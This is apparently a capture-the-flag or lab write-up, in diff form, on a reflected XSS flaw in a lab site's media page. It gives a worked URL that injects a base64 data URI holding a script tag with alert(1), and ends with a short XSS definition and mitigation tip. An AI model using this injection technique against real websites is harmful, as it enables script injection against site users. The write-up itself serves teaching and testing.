@@ -1,0 +1,25 @@
+we notice there's a clickable image in the website homepage
+and we can then notice that the image is loaded by an identifier
+
+change :
+http://10.11.100.177/?page=media&src=nsa
+
+to :
+http://10.11.100.177/?page=media&src=data:text/html;base64,$base64value
+
+example:
+http://10.11.100.177/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+
+
+
+(XSS) attacks are a type of injection, in which malicious scripts are injected
+into otherwise benign and trusted websites. XSS attacks occur when an attacker
+uses a web application to send malicious code.
+
+
+
+To protect against XSS attacks, make sure that any dynamic content
+coming from the HTTP request cannot be used to inject JavaScript on a page.
+
+-Escape Dynamic content
